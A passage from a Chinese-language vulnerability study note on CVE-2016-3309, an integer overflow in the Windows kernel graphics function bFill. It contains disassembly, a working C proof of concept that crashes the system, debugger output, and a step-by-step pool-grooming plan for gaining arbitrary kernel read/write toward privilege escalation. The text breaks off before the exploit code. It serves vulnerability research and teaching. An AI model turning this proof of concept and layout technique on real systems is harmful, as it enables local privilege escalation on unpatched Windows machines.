
# [原创]CVE-2016-3309提权漏洞学习笔记

# 一.前言

## 1.漏洞描述

该漏洞是存在于`win32kfull.sys`的`bFill`函数中的一个整型上溢漏洞，函数在申请内存的时候没有对申请的内存的大小是否发生整型溢出进行验证，导致申请的内存大小可以远小于期望申请的内存大小。随后函数又会根据期望申请的内存大小来对申请到的内存进行写入操作，这就引发了越界写入的问题，最终会在释放内存的时候因为破坏了相邻块的`_POOL_HEADER`而导致BSOD。通过适当的内存布局，可以利用这个越界写入操作修改`BitMap`对象的关键成员来实现任意地址读写入从而实现提权。

## 2.实验环境

- **操作系统：**Win10 1511 x64 企业版
- **编译器：**Visual Studio 2017
- **调试器：**IDA Pro, WinDbg

# 二.漏洞分析

## 1.漏洞成因

`bFill`函数的第一个参数是一个`EPATHOBJ`结构体，该结构体的定义如下，其中偏移`0x4`出保存的`cCurves`定义了曲线的数目，`bFill`函数用该值来计算要申请的内存大小。

```
typedef struct _EPATHOBJ
{
  PATHOBJ  po;
  PPATH   pPath;
  CLIPOBJ   *pco;
} EPATHOBJ, *PEPATHOBJ;

typedef struct _PATHOBJ {
  FLONG  fl;
  ULONG  cCurves;
} PATHOBJ;
```

以下是`bFill`函数的关键代码，函数会将`EPATHOBJ`中的`cCurves`取出，将其与`0x30`相乘得到的数值作为内存大小来申请内存。如果申请成功，就会在调用的`bConstructGET`函数中会对申请的内存进行写入操作，在`bFill`函数最后会将申请的内存释放。

```
.text:00000001C02C8D24 ; __int64 __fastcall bFill(struct EPATHOBJ *ePathObj, __m128i *a2, int a3, void (__stdcall *a4)(struct _RECTL *, unsigned int, void *), void *a5)
		// 省略部分代码
.text:00000001C02C8D56                 mov     rbx, rcx	;将第一个参数EPATHOBJ赋值给rbx
		// 省略部分代码
.text:00000001C02C90DE                 mov     eax, [rbx+4]    ; 将cCurves赋值给eax
.text:00000001C02C90E1                 cmp     eax, 14h        ; 比较eax是否大于0x14，如果大于则跳转，这里需要跳转才能申请
.text:00000001C02C90E4                 ja      short loc_1C02C90FA
.text:00000001C02C90F3                 and     [rsp+658h+isAlloc], 0	;如果不大于0x14，则不申请内存，该变量置0
.text:00000001C02C90F8                 jmp     short loc_1C02C9126
		// 省略部分代码
.text:00000001C02C90FA loc_1C02C90FA:                          ; 申请内存的代码
.text:00000001C02C90FA                 lea     ecx, [rax+rax*2]		; 将cCurves * 3的值赋给ecx
.text:00000001C02C90FD                 shl     ecx, 4          		; 将ecx左移4位，即乘以2^4 = 0x10，所以ecx = cCurves * 0x30
.text:00000001C02C9100                 xor     r8d, r8d
.text:00000001C02C9103                 mov     edx, 'gdeG'
.text:00000001C02C9108                 call    PALLOCMEM2		; 该函数会调用Win32AllocPool申请内存
.text:00000001C02C910D                 mov     r14, rax		; 将申请到的内存地址赋给r14
.text:00000001C02C9110                 mov     [rsp+658h+var_608], rax
.text:00000001C02C9115                 test    rax, rax			; 判断内存是否申请成功
.text:00000001C02C9118                 jz      loc_1C02C93CA
.text:00000001C02C911E                 mov     [rsp+658h+isAlloc], 1	;申请成功则将该变量置1
		// 省略部分代码
.text:00000001C02C9182                 mov     r8, r14         ; 将前面保存在r14的申请到的内存地址赋给r8
.text:00000001C02C9185                 lea     rdx, [rsp+658h+var_5A8] 
.text:00000001C02C918D                 mov     rcx, rbx        
.text:00000001C02C9190                 call    cs:__imp_bConstructGET	; 该函数会对申请到的内存地址进行写入操作
		// 省略部分代码
.text:00000001C02C93B8                 cmp     [rsp+658h+isAlloc], 0	; 通过变量isAlloc判断上面内存申请是否成功
.text:00000001C02C93BD                 jz      short loc_1C02C93C8
.text:00000001C02C93BF                 mov     rcx, r14        
.text:00000001C02C93C2                 call    cs:__imp_Win32FreePool	; 如果成功则释放内存
		// 省略部分代码
.text:00000001C02C93EC ?bFill@@YAHAEAVEPATHOBJ@@PEAU_RECTL@@KP6AX1KPEAX@Z2@Z endp
```

## 2.POC代码分析

以下是触发该漏洞的POC代码，该代码会通过调用`PolyLineTo`函数来增加`EPATHOBJ`的`cCurves`，共增加`0x156`次，每次增加`0x3FE01`。而在调用`bFill`函数前，`cCurves`还会被加1用来闭合曲线。因此，在`bFill`函数中申请的内存大小就会是`(0x156 * 0x3FE01 + 1) * 0x30 = 0x5555557 * 0x30 = 0x1 0000 00050`，溢出后就会是`0x50`。

```
BOOL POC_CVE_2016_3309()
{
	BOOL bRet = TRUE;

	static POINT points[0x3fe01];
	points[0].x = 1;
	points[0].y = 1;
	// Get Device context of desktop hwnd
	HDC hdc = GetDC(NULL);
	// Get a compatible Device Context to assign Bitmap to
	HDC hMemDC = CreateCompatibleDC(hdc);
	// Create Bitmap Object
	HGDIOBJ bitmap = CreateBitmap(0x5a, 0x1f, 1, 32, NULL);
	// Select the Bitmap into the Compatible DC
	HGDIOBJ bitobj = (HGDIOBJ)SelectObject(hMemDC, bitmap);
	//Begin path
	BeginPath(hMemDC);
	// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.
	for (int j = 0; j < 0x156; j++) {
		PolylineTo(hMemDC, points, 0x3FE01);
	}
	// End the path
	EndPath(hMemDC);
	// Fill the path
	FillPath(hMemDC);

	return bRet;
}
```

在申请内存处下中断，编译运行POC，就可以看到因为整型溢出此时申请的内存大小就远小于期望的大小。

```
1: kd> p
win32kfull!bFill+0x3d6:
fffff961`218c90fa 8d0c40          lea     ecx,[rax+rax*2]		               // ecx = eax * 3
1: kd> p
win32kfull!bFill+0x3d9:
fffff961`218c90fd c1e104          shl     ecx,4		              // ecx = ecx * 2^4 = ecx * 0x10 = eax * 0x30
1: kd> r ecx
ecx=10000005
1: kd> p
win32kfull!bFill+0x3dc:
fffff961`218c9100 4533c0          xor     r8d,r8d
1: kd> r rcx						// 此时rcx已经溢出为0x50
rcx=0000000000000050
1: kd> p
win32kfull!bFill+0x3df:
fffff961`218c9103 ba47656467      mov     edx,67646547h
1: kd> p
win32kfull!bFill+0x3e4:
fffff961`218c9108 e8ef3fd5ff      call    win32kfull!PALLOCMEM2 (fffff961`2161d0fc)
1: kd> p
win32kfull!bFill+0x3e9:
fffff961`218c910d 4c8bf0          mov     r14,rax
1: kd> r rax
rax=fffff90141c96380					// 申请的内存的地址
```

继续运行，就会越界写入操作修改了相邻内存块的`_POOL_HEAEDER`，从而在释放内存的时候产生BSOD错误，以下是部分错误信息：

```
1: kd> !analyze -v
*******************************************************************************

*                                                                             *

*                        Bugcheck Analysis                                    *

*                                                                             *

*******************************************************************************

BAD_POOL_HEADER (19)					// BSOD产生的原因
The pool is already corrupt at the time of the current request.
This may or may not be due to the caller.
The internal pool links must be walked to figure out a possible cause of
the problem, and then special pool applied to the suspect tags or the driver
verifier to a suspect driver.
Arguments:
Arg1: 0000000000000020, a pool block header size is corrupt.
Arg2: fffff90141c96370, The pool entry we were looking for within the page.	// 申请的内存块的_POOL_HEADER
Arg3: fffff90141c963d0, The next pool entry.				// 申请的内存块的下一内存块_POOL_HEADER
Arg4: 0000000025060037, (reserved)

SYMBOL_NAME:  win32kfull!bFill+2dd
```

# 三.漏洞利用

## 1.内存布局

该漏洞由于整型溢出可以越界写入相邻的内存，如果这些写入操作能修改`BitMap`对象的关键成员就可以实现任意地址写入。为了达到这个目标，需要特定的内存布局，在x64位操作系统上的池内存有以下的几个特点：

- 每一块申请的内存都会加上`0x10`字节大小的`_POOL_HEADER`
- 申请的内存大小如果超过`0x808`字节就会在新的内存页中申请该内存
- 连续的请求会从页的末尾开始分配，页尾的内存在释放的时候不会合并位于相邻内存页的下一内存块

本文的内存布局和参考链接中的不同，其中每一页的`0x1000`字节由`0xBC0`大小的剪切板对象，`0x3E0`大小的`BitMap`对象和`0x60`大小的加速表对象或空闲内存构成。这样，当触发漏洞的时候，申请的`0x50`加上`_POOL_HEADER`为`0x60`的内存就会占用其中位于页尾的空闲内存。这样，即使越界写入操作会修改相邻内存块的`_POOL_HEADER`，但此时的内存块位于下一内存页，所以在释放申请的`0x50`大小的内存块的时候，不会因为合并操作产生BSOD。此时，如果能利用越界写入操作修改相邻内存页中的`BitMap`对象中的关键成员，就可以实现任意地址读写。

![](https://bbs.kanxue.com/upload/attach/202205/835440_8R9BXBWWXF46J4Z.jpg)

想要创建上图的内存布局，同时让触发漏洞时候申请的内存刚好在中间的1000个内存页中`0x60`大的空闲内存中，需要通过以下几个步骤实现：

1. 通过加速表对象创建`0x60`大小的内存来消耗内存池中的空闲内存
2. 创建5000个`0xFA0`大小的`BitMap`对象，这样就会有5000个内存页中包含`0xFA0`大小的`BitMap`对象和`0x60`大小的空闲内存
3. 通过加速表对象创建5000个`0x60`字节大小的加速表占用第2步中`0x60`大小的空闲内存
4. 释放掉第2步中创建的`BitMap`对象，这样那5000个内存页中起始的`0xFA0`内存就会变成空闲内存
5. 创建5000个`0xBC0`大小的剪切板对象，这些对象会占用第4步释放`BitMap`对象而产生的内存页中起始的`0xFA0`的空闲内存中的`0xBC0`，这些`0xFA0`的空闲内存就会剩余`0xFA0 - 0xBC0 = 0x3E0`的空闲内存
6. 创建5000个`0x3E0`的`BitMap`对象，这些`BitMap`对象就会占用第5步中剩余的`0x3E0`的空闲内存
7. 释放掉第3步创建的中间一部分加速表对象，这样就会在第5步和第6步中创建的剪切板对象和`BitMap`对象后产生`0x60`大小的空闲内存，这样触发漏洞时候申请的内存就会刚好占用这些`0x60`大小的空闲内存

经过以上7个步骤就会形成上图的内存布局，相应代码如下，此时要注意在x64系统中，`BitMap`对象的对象头占`0x260`字节，加速表对象的对象头占`0x20`字节，剪切板对象的对象头占`0x14`字节。
